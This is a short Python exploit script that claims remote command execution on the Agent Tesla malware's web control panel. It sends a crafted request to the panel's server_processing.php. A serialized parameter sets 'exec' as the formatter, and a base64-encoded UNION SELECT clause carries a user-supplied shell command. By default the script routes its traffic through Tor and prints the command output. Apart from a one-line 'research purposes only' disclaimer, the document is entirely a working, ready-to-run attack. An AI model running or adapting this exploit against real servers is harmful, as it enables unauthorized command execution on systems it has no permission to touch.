

import requests
import argparse
import base64

# Agent Tesla C2 RCE by prsecurity
# For research purposes only. Don&#039;t pwn what you don&#039;t own.

def get_args():
	parser = argparse.ArgumentParser(
		prog="agent_tesla_sploit.py",
		formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=50),
		epilog= &#039;&#039;&#039;
		This script will exploit the RCE/SQL vulnerability in Agent Tesla Dashboard.
		&#039;&#039;&#039;)
	parser.add_argument("target", help="URL of WebPanel (ex: http://target.com/WebPanel/)")
	parser.add_argument("-c", "--command", default="id", help="Command to execute (default = id)")
	parser.add_argument("-p", "--proxy", default="socks5://localhost:9150", help="Configure a proxy in the format http://127.0.0.1:8080/ (default = tor)")
	args = parser.parse_args()
	return args

def pwn_target(target, command, proxy):
	requests.packages.urllib3.disable_warnings()
	proxies = {&#039;http&#039;: proxy, &#039;https&#039;: proxy}
	print(&#039;[*] Probing...&#039;)
	get_params = {
		&#039;table&#039;:&#039;screens&#039;, 
		&#039;primary&#039;:&#039;HWID&#039;, 
		&#039;clmns&#039;:&#039;a:1:{i:0;a:3:{s:2:"db";s:4:"HWID";s:2:"dt";s:4:"HWID";s:9:"formatter";s:4:"exec";}}&#039;, 
		&#039;where&#039;: base64.b64encode("1=1 UNION SELECT \"{}\"".format(command).encode(&#039;utf-8&#039;))
	}
	target = target + &#039;/server_side/scripts/server_processing.php&#039;
	try:
		r = requests.get("http://bot.whatismyipaddress.com", proxies=proxies)
		print("[*] Your IP: {}".format(r.text))
		headers = {
			"User-agent":"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
		}
		r = requests.get(target, params=get_params, headers=headers, verify=False, proxies=proxies)
		result = r.json()[&#039;data&#039;][-1][&#039;HWID&#039;]
		print(&#039;[+] {}&#039;.format(result))
	except:
		print("[-] ERROR: Something went wrong.")
		print(r.text)
		raise

def main():
	print ()
	print (&#039;Agent Tesla RCE by prsecurity.&#039;)
	args = get_args()
	pwn_target(args.target.strip(), args.command.strip(), args.proxy.strip())


if __name__ == &#039;__main__&#039;:
	main()

